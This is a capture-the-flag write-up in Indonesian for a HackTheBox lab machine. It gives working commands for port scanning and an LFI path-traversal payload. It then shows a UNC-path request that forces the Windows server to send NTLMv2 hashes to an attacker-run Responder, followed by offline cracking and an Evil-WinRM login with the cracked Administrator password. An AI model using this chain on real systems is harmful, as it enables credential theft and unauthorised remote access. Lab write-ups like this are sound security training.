# Responder — LFI + NTLM Hash Capture + WinRM

**Date:** 2026-05-09
**Platform:** HackTheBox Starting Point
**Difficulty:** Very Easy
**Category:** Web / Network / Windows

---

## Target

Mesin Windows yang menjalankan web server Apache dengan PHP. Website memiliki fitur ganti bahasa yang menggunakan parameter URL untuk memuat konten — celah utama ada di sini. Selain web server, mesin juga menjalankan WinRM yang nantinya digunakan untuk remote access setelah kredensial berhasil didapat.

## Vulnerability

Parameter `page=` pada website tidak memvalidasi input pengguna, sehingga bisa dimanfaatkan untuk:

1. **Local File Inclusion (LFI)** — memuat file lokal di server target menggunakan path traversal (`../`)
2. **RFI via UNC Path** — mengarahkan parameter ke IP kita sebagai attacker, memancing server Windows untuk melakukan autentikasi NTLM ke mesin kita, sehingga hash kredensial bisa ditangkap

Perilaku Windows yang secara otomatis mengirim NTLMv2 hash saat mencoba akses network share adalah inti dari serangan ini.

## Tools Used

- Nmap
- Responder
- John the Ripper
- Hashcat
- Evil-WinRM

---

## Exploitation Steps

### Step 1 — Reconnaissance

Scan semua port untuk mengetahui service yang berjalan di target.

```bash
nmap -sV -sC -p- --min-rate 5000 10.129.26.105
```

Hasil yang relevan:
```
80/tcp   open  http    Apache httpd 2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open  http    Microsoft HTTPAPI 2.0 (WinRM)
7680/tcp open  pando-pub?
Service Info: OS: Windows
```

Port 80 menjalankan Apache + PHP, dan port 5985 adalah WinRM — ini akan berguna nanti untuk remote access.

---

### Step 2 — Akses Website & Virtual Host Setup

Membuka IP target di browser melakukan redirect ke `unika.htb` yang tidak bisa di-resolve karena bukan domain publik. Perlu didaftarkan manual ke `/etc/hosts`.

```bash
echo "10.129.26.105  unika.htb" | sudo tee -a /etc/hosts
```

Verifikasi:
```bash
cat /etc/hosts
```

Setelah ini, website bisa diakses normal di browser.

---

### Step 3 — Menemukan Parameter Vulnerable (LFI)

Website memiliki fitur ganti bahasa. Dengan mengklik opsi bahasa berbeda, URL berubah menjadi:

```
http://unika.htb/index.php?page=french
http://unika.htb/index.php?page=german
```

Parameter `page=` kemungkinan besar melakukan `include()` terhadap file berdasarkan nilai yang diinput. Ini adalah tanda klasik LFI.

**Konfirmasi LFI dengan path traversal:**

```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

Isi file hosts Windows berhasil terbaca di browser — **LFI confirmed**.

> Catatan: Pakai banyak `../` sekaligus karena sistem otomatis berhenti di root, jadi tidak perlu menghitung posisi folder dengan tepat.

---

### Step 4 — Menangkap Hash via Responder

Setelah LFI terkonfirmasi, langkah selanjutnya adalah memanfaatkan parameter yang sama untuk memancing server Windows melakukan autentikasi ke mesin kita.

**Cek IP interface VPN HTB:**
```bash
ip a
# Lihat interface tun0 → 10.10.14.180
```

**Jalankan Responder di terminal terpisah:**
```bash
sudo responder -I tun0 -v
```

Responder akan menyalakan server palsu (SMB, HTTP, dll) yang siap menangkap autentikasi.

**Pancing koneksi dari target via browser:**
```
http://unika.htb/index.php?page=//10.10.14.180/somefile
```

Server Windows mencoba mengakses network share di IP kita. Dalam proses koneksi itu, Windows otomatis mengirim NTLMv2 hash — Responder menangkapnya.

Hash tersimpan otomatis di:
```
/usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.186.239.txt
```

---

### Step 5 — Crack Hash

**Siapkan wordlist rockyou.txt jika belum di-extract:**
```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

**Crack menggunakan John the Ripper:**
```bash
john -w=/usr/share/wordlists/rockyou.txt /usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.186.239.txt
```

**Atau menggunakan Hashcat (mode 5600 = NTLMv2):**
```bash
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.186.239.txt /usr/share/wordlists/rockyou.txt
```

Hasil crack:
```
Username : Administrator
Password : badminton
```

---

### Step 6 — Remote Access via Evil-WinRM

Dengan kredensial yang sudah didapat dan port WinRM 5985 yang terbuka, login ke mesin target:

```bash
evil-winrm -i 10.129.26.105 -u Administrator -p badminton
```

Berhasil masuk dengan shell PowerShell di mesin target:
```
*Evil-WinRM* PS C:\>
```

---

### Step 7 — Navigasi & Ambil Flag

Cek semua user yang ada:
```powershell
dir C:\Users
```

Ada user: `Administrator`, `mike`, `Public`

Flag ternyata bukan di Administrator tapi di user `mike`:
```powershell
cd C:\Users\mike\Desktop
dir
cat flag.txt
```

---

## Proof

```
Flag: ea81b7afddd03efaa0945333ed147fac
```

---

## Attack Chain Summary

```
Nmap scan
  → Port 80 (Apache + PHP), Port 5985 (WinRM)
    → Tambah unika.htb ke /etc/hosts
      → Temukan parameter page= vulnerable (LFI)
        → Konfirmasi LFI dengan baca file hosts Windows
          → Arahkan page= ke IP kita + Responder listening (RFI)
            → NTLMv2 hash Administrator tertangkap
              → Crack hash → password: badminton
                → Login Evil-WinRM port 5985
                  → Flag di C:\Users\mike\Desktop
```

---

## Lessons Learned

- Virtual host di HTB perlu didaftarkan manual ke `/etc/hosts` karena tidak ada di DNS publik
- Path traversal `../` yang banyak itu aman — sistem berhenti di root, tidak bisa kelewatan
- LFI dan RFI bukan dua serangan terpisah di sini — LFI adalah pintu masuk, RFI adalah senjata utamanya
- Windows secara otomatis mengirim NTLMv2 hash saat mencoba akses network share — ini perilaku protokol NTLM yang bisa disalahgunakan
- Hash tidak bisa di-decode, hanya bisa di-crack dengan wordlist
- John the Ripper lebih mudah untuk pemula (deteksi hash otomatis), Hashcat lebih cepat tapi perlu tahu nomor mode
- Flag tidak selalu ada di user Administrator — selalu cek semua user di `C:\Users\`
- PowerShell punya perintah yang berbeda dari bash: `dir` bukan `ls`, `Set-Location` bukan `cd` (walaupun `cd` tetap jalan)